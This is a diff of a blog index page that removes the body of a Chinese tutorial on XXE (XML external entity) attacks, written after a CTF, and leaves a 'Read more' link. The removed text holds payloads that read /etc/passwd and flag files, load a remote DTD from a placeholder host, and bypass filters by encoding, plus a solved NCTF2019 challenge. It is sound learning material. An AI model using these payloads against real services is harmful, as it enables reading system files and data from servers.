@@ -355,72 +355,16 @@
 
       
         
-          
-            <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><blockquote>
+          <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><blockquote>
 <p>打hgame的时候打出来一个新知识点，赶紧记录下这个漏洞。不过在学习xxe之前，我们要先认识xml。</p>
 </blockquote>
-<h1 id="认识xml"><a href="#认识xml" class="headerlink" title="认识xml"></a>认识xml</h1><h2 id="什么是xml"><a href="#什么是xml" class="headerlink" title="什么是xml"></a>什么是xml</h2><p>XML（EXtensible Markup Language），即可扩展标记语言，是一种标记语言，其标签没有预定义，您需要自行定义标签，是W3C的推荐标准。其于HTML的区别是：</p>
-<ul>
-<li>HTML 被设计用来显示数据</li>
-<li>XML 被设计用来传输和存储数据</li>
-<li>XML标签根据自己主观定义，不像HTML是被预定义好的</li>
-</ul>
-<p>下面这个便是典型的xml文档：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;!--XML声明--&gt;</span><br><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span><br><span class="line"></span><br><span class="line">&lt;!--DTD，可选--&gt;          </span><br><span class="line">&lt;!DOCTYPE any[ </span><br><span class="line">    &lt;!ENTITY xxe SYSTEM &quot;file:///etc/passwd&quot; &gt;</span><br><span class="line">]&gt;</span><br><span class="line"></span><br><span class="line">&lt;!--文档元素--&gt;                                                                          </span><br><span class="line">&lt;foo&gt;&amp;xxe;&lt;/foo&gt;</span><br></pre></td></tr></table></figure>
-
-<h1 id="什么是DTD"><a href="#什么是DTD" class="headerlink" title="什么是DTD"></a>什么是DTD</h1><p>DTD（Document Type Definition），即文档类型定义，作用是定义XML文档的合法构建模块。</p>
-<h2 id="DTD声明"><a href="#DTD声明" class="headerlink" title="DTD声明"></a>DTD声明</h2><p>DTD可被成行地声明于XML文档中，也可作为一个外部引用。</p>
-<ul>
-<li>内部DOCTYPE声明：<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE 根元素 [元素声明]&gt;</span><br></pre></td></tr></table></figure></li>
-</ul>
-<p>例如：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE any[</span><br><span class="line">    &lt;!ENTITY a &quot;admin&quot;&gt;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;sender&gt;&amp;a&lt;/sender&gt;</span><br><span class="line"></span><br><span class="line">&lt;!-- admin --&gt;</span><br></pre></td></tr></table></figure>
-
-<ul>
-<li>外部文档声明:<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE 根元素 SYSTEM &quot;文件名&quot;&gt;</span><br></pre></td></tr></table></figure></li>
-</ul>
-<p>例如：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE any[</span><br><span class="line">    &lt;!ENTITY % a SYSTEM &quot;http://xx.xx.xx.xx/xml.dtd&quot;&gt;</span><br><span class="line">    %a;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;flag&gt;&amp;b&lt;/flag&gt;</span><br><span class="line">&lt;!-- dGhpc18xc180X2ZMYTk= --&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">xx.xx.xx.xx/xml.dtd:</span><br><span class="line">&lt;!ENTITY b SYSTEM &quot;data://text/plain;base64,dGhpc18xc180X2ZMYTk=&quot;&gt;</span><br></pre></td></tr></table></figure>
-
-<h2 id="DTD实体"><a href="#DTD实体" class="headerlink" title="DTD实体"></a>DTD实体</h2><p>DTD实体一般分为三种：内部实体、参数实体以及外部实体。</p>
-<ul>
-<li>内部实体：<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY 实体名称 &quot;实体的值&quot;&gt;</span><br></pre></td></tr></table></figure></li>
-</ul>
-<p>例如：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE any[</span><br><span class="line">    &lt;!ENTITY a &quot;admin&quot;&gt;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;sender&gt;&amp;a&lt;/sender&gt;</span><br><span class="line"></span><br><span class="line">&lt;!-- admin --&gt;</span><br></pre></td></tr></table></figure>
-
-<ul>
-<li>外部实体：<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY 实体名称 SYSTEM &quot;URI&quot;&gt;</span><br></pre></td></tr></table></figure></li>
-</ul>
-<p>例如：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE any[</span><br><span class="line">    &lt;!ENTITY a SYSTEM &quot;php://filter/read=convert.base64-encode/resource=flag.php&quot;&gt;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;flag&gt;&amp;a&lt;/flag&gt;</span><br><span class="line"></span><br><span class="line">&lt;!-- dGhpc18xc180X2ZMYTk= --&gt;</span><br></pre></td></tr></table></figure>
-
-<ul>
-<li>参数实体：<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY %实体名称 &quot;实体的值&quot;&gt;</span><br><span class="line">&lt;!ENTITY %实体名称 SYSTEM &quot;URI&quot;&gt;</span><br></pre></td></tr></table></figure></li>
-</ul>
-<p>例如：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE any[</span><br><span class="line">    &lt;!ENTITY % a &quot;&lt;!ENTITY b &quot;admin&quot;&gt;&quot;&gt;</span><br><span class="line">	&lt;!ENTITY % c &quot;&lt;!ENTITY d SYSTEM &quot;php://filter/read=convert.base64-encode/resource=flag.php&quot;&gt;&quot;&gt;</span><br><span class="line">    %a;</span><br><span class="line">	%c;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;sender&gt;&amp;b;&amp;d&lt;/sender&gt;</span><br><span class="line"></span><br><span class="line">&lt;!-- admindGhpc18xc180X2ZMYTk= --&gt;</span><br></pre></td></tr></table></figure>
-<p>注意：参数实体用<code>% name</code>声明，引用时用<code>%name;</code>，只能在DTD中申明，DTD中引用。</p>
-<p>外部实体引用可支持多种协议：<br><img src="https://s2.loli.net/2022/02/14/bKIYnM9TRgZiOqh.png"></p>
-<h1 id="XXE攻击时的绕过"><a href="#XXE攻击时的绕过" class="headerlink" title="XXE攻击时的绕过"></a>XXE攻击时的绕过</h1><h2 id="ENTITY、SYSTEM、file等关键词过滤"><a href="#ENTITY、SYSTEM、file等关键词过滤" class="headerlink" title="ENTITY、SYSTEM、file等关键词过滤"></a>ENTITY、SYSTEM、file等关键词过滤</h2><p>编码转化为UTF-16绕过：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat payload.xml | iconv -f utf-8 -t utf-16be &gt; payload.8-16be.xml</span><br></pre></td></tr></table></figure>
-
-<h2 id="http被过滤"><a href="#http被过滤" class="headerlink" title="http被过滤"></a>http被过滤</h2><p>data伪协议绕过、html实体编码绕过、文件上传等等，以data伪协议为例：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot;&gt;</span><br><span class="line">&lt;!DOCTYPE any[</span><br><span class="line">    &lt;!ENTITY % a SYSTEM &quot;data://text/plain;base64,PCFFTlRJVFkgJSBiIFNZU1RFTSAnaHR0cDovL3h4Lnh4Lnh4Lnh4L3htbC5kdGQnPg==&quot;&gt;</span><br><span class="line">    %a;</span><br><span class="line">    %b;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;flag&gt;&amp;a;&lt;/flag&gt;</span><br><span class="line"></span><br><span class="line">&lt;!--编码内容--&gt;</span><br><span class="line">&lt;!ENTITY % b SYSTEM &#x27;http://xx.xx.xx.xx/xml.dtd&#x27;&gt;</span><br></pre></td></tr></table></figure>
-
-<h2 id="NCTF2019-Fake-XML-cookbook"><a href="#NCTF2019-Fake-XML-cookbook" class="headerlink" title="[NCTF2019]Fake XML cookbook"></a>[NCTF2019]Fake XML cookbook</h2><p>这题还是比较简单的，基本简单了解下xml就可以做出来了。</p>
-<p>进入网页发现是要进行登录，尝试抓包发现POST部分是xml：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;user&gt;&lt;username&gt;1&lt;/username&gt;&lt;password&gt;1&lt;/password&gt;&lt;/user&gt;</span><br></pre></td></tr></table></figure>
-
-<p>因此直接构造外部引用读取：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE any[</span><br><span class="line">  &lt;!ENTITY a SYSTEM &quot;file:///flag&quot;&gt;</span><br><span class="line">  ]&gt;</span><br><span class="line">&lt;user&gt;&lt;username&gt;&amp;a;&lt;/username&gt;&lt;password&gt;123456&lt;/password&gt;&lt;/user&gt;</span><br></pre></td></tr></table></figure>
-
-<p>读取flag：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;result&gt;&lt;code&gt;0&lt;/code&gt;&lt;msg&gt;flag&#123;e9ac9a2a-8a06-47c9-8cb1-0dd2ecbeb01f&#125;</span><br><span class="line">&lt;/msg&gt;&lt;/result&gt;</span><br></pre></td></tr></table></figure>
-
-<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>这篇博客简单总结了下xxe的基础知识，实际上，xxe还有其他的用途，例如探测内网、RCE、DOS等都可以用上，因此xxe还是十分好用的。</p>
-
-          
+          <!--noindex-->
+          <div class="post-button text-center">
+            <a class="btn" href="/2022/02/13/XXE%E7%9A%84%E5%AD%A6%E4%B9%A0/#more" rel="contents">
+              Read more &raquo;
+            </a>
+          </div>
+          <!--/noindex-->
         
       
     </div>
